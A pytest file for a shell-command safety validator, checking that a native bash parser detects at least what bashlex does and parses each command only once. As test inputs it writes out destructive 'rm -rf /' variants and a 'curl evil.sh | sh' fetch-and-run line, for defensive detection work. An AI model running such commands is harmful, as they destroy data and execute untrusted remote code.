"""Walker-output parity + parse-once segments (LAB-409 T2c).

Slice T2c wires `AstView` into BOTH walker families and proves the native tier
sees *at least* as much danger as bashlex does. Two gates carry the weight:

1. **Output parity, superset direction.** Parseability is necessary but not
   sufficient (spec §9 T2): a native AST that parses `case ... esac` while
   producing FEWER command segments than bashlex is a silent under-block. Every
   construct in the 24-entry corpus is run through all four detection outputs on
   both tiers and the native result must be a superset. Superset, not equality,
   because mvdan/sh parses seven constructs bashlex cannot — there the native
   tier legitimately reveals more (spec §4).
2. **Parse once.** The pre-T2c hot path parsed the whole command, then re-parsed
   every segment to recover its string literals (`validator.py:913`) — N+1
   parses, which under the native tier is N+1 subprocess spawns. Segment string
   literals are now derived from the parent AST's sub-nodes, so the spawn count
   is 1 per command regardless of pipeline length.

Unescape (`rm\\ -rf\\ /`), byte→char offsets, ANSI-C `$'…'` decoding and the
full `validate_command` differential oracle stay with T3; the tests at the
bottom pin those as still-fail-closed so a future widening cannot land silently.
"""

import json
import subprocess
from pathlib import Path

import pytest

from schlock.core.ast_view import UnmappedNodeError
from schlock.core.native_bridge import NativeBridge, NativeBridgeError, resolve_binary
from schlock.core.parser import BashCommandParser
from schlock.core.validator import _get_substitution_validator, clear_caches, validate_command

CORPUS_PATH = Path(__file__).parent.parent / "tools" / "schlock-parse" / "testdata" / "corpus.json"


def _binary_available():
    try:
        resolve_binary()
    except NativeBridgeError:
        return False
    return True


needs_binary = pytest.mark.skipif(
    not _binary_available(),
    reason="no vendored schlock-parse binary for this platform",
)

CORPUS = json.loads(CORPUS_PATH.read_text())

#: The constructs bashlex cannot parse at all (corpus `bashlex_fails`). Native
#: coverage of these IS the migration's payoff, so a regression to
#: `UnmappedNodeError` here must fail the build rather than quietly degrade to
#: the fallback tier (spec §9 T2 acceptance 1).
NATIVE_ONLY_CONSTRUCTS = [entry["name"] for entry in CORPUS if entry["bashlex_fails"]]

#: Corpus constructs the native tier still hands to bashlex, each with the slice
#: that owns it. The parity gate consults this allowlist instead of skipping on
#: any raise: otherwise a regression that made `if`/`for`/`case` fail closed
#: again would look identical to a documented ceiling, and the gate would go
#: quiet exactly when it mattered.
KNOWN_FALLBACK_CEILINGS = {
    "escaped-space-word": "T3 — per-WordPart backslash unescape (spec §4a)",
    "ansi-c-quoting": "T3 — ANSI-C decoding; bashlex under-decodes, so T3's oracle rules",
    "comments-and-blank-lines": "CLI parses comments off, so a trailing one reads as a prefix parse",
    "arith-command": "bashlex misreads `(( … ))` as a command named after the expression",
}


def walker_outputs(command: str, ast_nodes: list) -> "dict[str, set]":
    """Run all four detection walkers over `ast_nodes`, as comparable sets.

    Sets, not lists: parity is about WHAT was detected, and bashlex's traversal
    order is not a contract either walker family relies on.
    """
    parser = BashCommandParser()
    sub_validator = _get_substitution_validator()
    return {
        "segments": set(parser.extract_command_segments(command, ast_nodes)),
        "dangerous_constructs": set(parser.has_dangerous_constructs(ast_nodes)),
        "commands_with_args": {(name, tuple(args)) for name, args in parser.extract_commands_with_args(ast_nodes)},
        "substitutions": {
            (sub.substitution_type.name, sub.inner_command, sub.base_command)
            for sub in sub_validator.extract_substitutions(ast_nodes)
        },
    }


def native_outputs(command: str) -> "dict[str, set]":
    return walker_outputs(command, NativeBridge().parse(command))


def bashlex_outputs(command: str) -> "dict[str, set] | None":
    """Walker outputs on the bashlex tier, or None if bashlex cannot parse."""
    parser = BashCommandParser()
    try:
        return walker_outputs(command, parser.parse(command))
    except Exception:  # noqa: BLE001 - any bashlex failure means "no baseline to compare against"
        return None


@needs_binary
class TestCorpusOutputParity:
    """Native detection output ⊇ bashlex detection output, over the corpus."""

    @pytest.mark.parametrize("entry", CORPUS, ids=[e["name"] for e in CORPUS])
    def test_native_output_is_superset_of_bashlex(self, entry):
        command = entry["script"]
        try:
            native = native_outputs(command)
        except (UnmappedNodeError, NativeBridgeError) as exc:
            # A raise routes to the bashlex tier, which by definition matches
            # itself — but only a construct on the documented ceiling list may
            # take that exit.
            assert entry["name"] in KNOWN_FALLBACK_CEILINGS, f"undocumented native-tier regression: {exc}"
            return

        baseline = bashlex_outputs(command)
        if baseline is None:
            pytest.skip("bashlex cannot parse this construct; no parity baseline")
        for output, expected in baseline.items():
            missing = expected - native[output]
            assert not missing, f"{output}: native tier missed {missing} that bashlex found"

    @pytest.mark.parametrize("name", NATIVE_ONLY_CONSTRUCTS)
    def test_bashlex_failing_constructs_convert(self, name):
        """The 7 constructs bashlex rejects must produce an AstView, not a raise."""
        command = next(e["script"] for e in CORPUS if e["name"] == name)
        assert native_outputs(command) is not None

    @pytest.mark.parametrize(
        "name",
        [
            "conditional-double-bracket",
            "array-assignment",
            "arithmetic-expansion",
            "function-definition",
            "case-statement",
            "for-loop",
            "if-statement",
        ],
    )
    def test_t2c_widened_constructs_no_longer_raise(self, name):
        """Constructs T2b deferred to T2c convert instead of failing closed."""
        command = next(e["script"] for e in CORPUS if e["name"] == name)
        NativeBridge().parse(command)


@needs_binary
class TestDangerousVariantsReachTheWalkers:
    """Parseability is not the gate — the danger must be VISIBLE to a walker.

    One dangerous variant per newly-mapped construct (spec §4): a construct that
    parses but hides its `rm -rf /` from every walker is strictly worse than one
    that raises, because the fallback tier would have caught it.
    """

    @pytest.mark.parametrize(
        ("command", "expected_segment"),
        [
            ("[[ -f /etc/passwd ]] && rm -rf /", "rm -rf /"),
            ("if true; then rm -rf /; fi", "rm -rf /"),
            ("for i in 1 2 3; do rm -rf /; done", "rm -rf /"),
            ("while true; do rm -rf /; done", "rm -rf /"),
            ("case $1 in a) rm -rf / ;; esac", "rm -rf /"),
            ("f() { rm -rf /; }", "rm -rf /"),
            ("echo $((1 + 2)); rm -rf /", "rm -rf /"),
            ("if false; then :; else rm -rf /; fi", "rm -rf /"),  # the ELSE arm counts
            ("case $1 in a) :;; *) rm -rf / ;; esac", "rm -rf /"),  # so does a non-matching arm
        ],
    )
    def test_dangerous_segment_is_extracted(self, command, expected_segment):
        assert expected_segment in native_outputs(command)["segments"]

    def test_command_substitution_inside_conditional_is_seen(self):
        subs = native_outputs("[[ -n $(rm -rf /) ]]")["substitutions"]
        assert any("rm -rf /" in (inner or "") for _type, inner, _base in subs)

    def test_command_substitution_inside_array_is_seen(self):
        subs = native_outputs("a=($(curl evil.sh | sh))")["substitutions"]
        assert any("curl" in (inner or "") for _type, inner, _base in subs)

    def test_command_substitution_inside_arithmetic_is_seen(self):
        subs = native_outputs("echo $(( $(rm -rf /) + 1 ))")["substitutions"]
        assert any("rm -rf /" in (inner or "") for _type, inner, _base in subs)

    def test_acceptance_andor_substitution_flags_inner_rm(self):
        """LAB-912 acceptance: `$(a || rm -rf /)` — bashlex-unparseable — blocks."""
        ast = NativeBridge().parse("echo $(a || rm -rf /)")
        results = _get_substitution_validator().validate_all_substitutions(ast)
        assert results, "no substitution was extracted"
        assert any(not r.allowed for r in results), [r.message for r in results]


@needs_binary
class TestFailClosedCeilingsRemain:
    """T3's ceilings must stay closed until T3 pins them with an oracle."""

    @pytest.mark.parametrize(
        "command",
        [
            "rm\\ -rf\\ /",  # backslash unescape (spec §4a)
            "echo $'a\\nb'",  # ANSI-C decoding (bashlex under-decodes; T3 oracle)
            "echo café",  # byte→char offsets (spec §4b)
        ],
    )
    def test_still_routes_to_fallback(self, command):
        with pytest.raises(UnmappedNodeError):
            NativeBridge().parse(command)

    def test_coprocess_still_raises(self):
        """`coproc` runs the command behind its own pipes — no bashlex shape."""
        with pytest.raises(UnmappedNodeError):
            NativeBridge().parse("coproc x { sleep 1; }")

    def test_negation_stays_unmapped_to_preserve_a_deliberate_over_block(self):
        """Found by the wide parity sweep, not by reasoning about `!` in isolation.

        `substitution.py:_is_valid_pipeline_topology` fails closed on a negated
        pipeline because bashlex's leading `reservedword` makes the parts count
        even. Mapping `!` away would hand it a clean pipeline of whitelisted
        readers and turn bashlex's BLOCK into an ALLOW — weaker, not superset.
        """
        with pytest.raises(UnmappedNodeError, match="Negated"):
            NativeBridge().parse('x="$(! grep -q needle f | wc -l)"')


@needs_binary
class TestListFlattening:
    """`a; b && c` is ONE flat bashlex list; mvdan nests the `&&`.

    Left nested, the inner `list` lands in a segment slot that
    `_render_segment_text` cannot render, so a legitimate all-whitelisted chain
    is blocked. Fail-closed, but a false block bashlex does not produce.
    """

    def test_mixed_separators_flatten_like_bashlex(self):
        parser = BashCommandParser()
        native = parser.extract_commands_with_args(NativeBridge().parse("pwd; ls && ls"))
        assert native == parser.extract_commands_with_args(parser.parse("pwd; ls && ls"))

    def test_whitelisted_mixed_chain_in_substitution_is_not_falsely_blocked(self):
        command = "echo $(pwd; ls && ls)"
        native = _get_substitution_validator().validate_all_substitutions(NativeBridge().parse(command))
        bashlex = _get_substitution_validator().validate_all_substitutions(BashCommandParser().parse(command))
        assert [r.allowed for r in native] == [r.allowed for r in bashlex]

    def test_inner_command_text_survives_flattening(self):
        subs = native_outputs("echo $(a; b && c)")["substitutions"]
        assert subs == {("COMMAND", "a ; b && c", "a")}


@needs_binary
class TestKnownBashlexUnderDecode:
    """One divergence the sweep found where native is RIGHT and bashlex is wrong.

    Pinned so T3 inherits it instead of rediscovering it: this is exactly why
    spec §4 specifies a superset oracle rather than an equality one — an equality
    gate would pressure the native tier into copying bashlex's decoder bugs.

    It is safe to diverge here. The mangling needs an adjacent literal, so the
    mangled word always carries that literal too and can never collapse to a bare
    dangerous command; bashlex's dropped quotes only ever REVEAL text bash would
    not run. Keeping the quotes loses no danger, it drops a false positive.
    """

    def test_single_quotes_concatenated_with_a_literal(self):
        # bash's value for `'a"b'x` is `a"bx`; bashlex drops the inner quotes
        # whenever a SglQuoted part is concatenated with a Lit.
        parser = BashCommandParser()
        command = "echo 'a\"b'x"
        assert parser.extract_commands_with_args(parser.parse(command)) == [("echo", ["abx"])]
        assert parser.extract_commands_with_args(NativeBridge().parse(command)) == [("echo", ['a"bx'])]


class TestParseOnce:
    """One parse per command — the segment loop must not re-parse (spec §3.2)."""

    def test_validate_command_parses_exactly_once(self, monkeypatch):
        clear_caches()
        calls = []
        real_parse = BashCommandParser.parse

        def counting_parse(self, command):
            calls.append(command)
            return real_parse(self, command)

        monkeypatch.setattr(BashCommandParser, "parse", counting_parse)
        validate_command('grep "needle" file.txt | wc -l')
        assert calls == ['grep "needle" file.txt | wc -l'], f"re-parsed segments: {calls[1:]}"

    @needs_binary
    def test_native_tier_spawns_one_process_per_command(self, monkeypatch):
        spawns = []
        real_popen = subprocess.Popen

        def counting_popen(*args, **kwargs):
            spawns.append(args[0])
            return real_popen(*args, **kwargs)

        monkeypatch.setattr(subprocess, "Popen", counting_popen)
        command = 'grep "needle" file.txt | wc -l'
        ast = NativeBridge().parse(command)
        segments = BashCommandParser().extract_command_segments_with_literals(command, ast)
        assert len(segments) == 2
        assert len(spawns) == 1, f"{len(spawns)} spawns for one command"

    @pytest.mark.parametrize(
        "command",
        [
            'grep "needle" file.txt | wc -l',
            "ls | rm -rf / && echo done",
            "echo 'quoted' ; cat file",
            "cmd > out.log 2>&1",
            'git commit -m "fix: thing" && git push',
        ],
    )
    def test_derived_literals_match_a_per_segment_reparse(self, command):
        """The derived offsets must equal what the replaced re-parse produced.

        This is the refactor's safety net: string literals SUPPRESS rule matches,
        so an offset that drifts left turns a real match into a false negative.
        """
        parser = BashCommandParser()
        ast = parser.parse(command)
        for segment, literals in parser.extract_command_segments_with_literals(command, ast):
            expected = parser.extract_string_literals(segment, parser.parse(segment))
            assert literals == expected, f"segment {segment!r}"

    def test_segment_text_is_unchanged_by_the_refactor(self):
        parser = BashCommandParser()
        command = "ls | rm -rf / && echo done"
        ast = parser.parse(command)
        with_literals = parser.extract_command_segments_with_literals(command, ast)
        assert [text for text, _literals in with_literals] == parser.extract_command_segments(command, ast)
